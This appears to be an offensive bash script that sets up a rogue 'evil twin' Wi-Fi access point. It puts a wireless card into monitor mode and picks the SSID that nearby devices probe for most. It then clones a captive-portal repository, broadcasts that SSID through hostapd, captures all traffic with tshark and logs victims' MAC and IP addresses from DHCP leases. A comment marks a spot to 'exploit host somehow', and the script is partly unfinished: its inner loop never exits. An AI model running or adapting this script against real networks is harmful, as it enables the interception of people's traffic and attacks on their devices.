#!/bin/bash

if [[ "$(id -u)" != "0" ]]; then
	echo -e "\nThis script must be run as root" 1>&2
	exit 0
fi

trap control_c SIGINT

function control_c() {
	echo -e "\e[91mCTRL C Detected!\n"
	pkill -f dnsmasq
	pkill -f hostapd
	pkill -f tmux
	pkill -f tshark
	echo -e "\e[91mExiting!"
	exit $?
}

# Need to setup wireless device

airmon-ng check kill
/etc/init.d/avahi-daemon stop

iwconfig 
airmon-ng start wlan0
iwconfig 

echo "Test wireless device"
timeout --foreground 3 airodump-ng wlan0mon

#Perform Probe Count
echo "Perform Probe Count"

SSID=$(python probe_count.py wlan0mon 30)
echo -e "SSID: $SSID\n"

# Install prereqs for Captive Portal
apt update
apt -y install hostapd dnsmasq apache2

git clone https://github.com/AloysAugustin/captive_portal.git
cd captive_portal

for f in $(ls); do sed -i 's/wlan0/wlan0mon/g' $f; done

sed -i 's/FR/US/g' hostapd.conf
sed -i "s/CaptiveWifi/$SSID/g" hostapd.conf
sed -i 's/channel=10/channel=6/g' hostapd.conf

bash start.sh
#tmux attach

# Capture all packets from specific address
tshark -i wlan0mon -w wlan0mon_capture 2>&1 &

# What else can we do?

# Watch for new associations
while true; do
	# Leases are stored in /var/lib/misc/dnsmasq.leases
	MACS=`awk '{ print $2 }' /var/lib/misc/dnsmasq.leases | paste -d ' ' -s`
	echo -e "MACS: $MACS\n"

	# Approve Internet
	for mac in $MACS; do
		echo -e "Adding rule for $mac\n"
#		/sbin/iptables -I internet 1 -t mangle -m mac --mac-source $mac -j RETURN
	done
	LEASES=`awk '{ print $3 }' /var/lib/misc/dnsmasq.leases | paste -d , -s`
	echo -e "LEASES: $LEASES\n"

	# Exploit host somehow
	# here



	# Generate 0 or 1 every 30s to decide to drop internet
	while true; do
		var=$(($RANDOM%2))
		if [[ $var -eq "1" ]]; then
			ifconfig eth0 down
			sleep 5
			ifconfig eth0 up
		fi
	done
	sleep 15
done
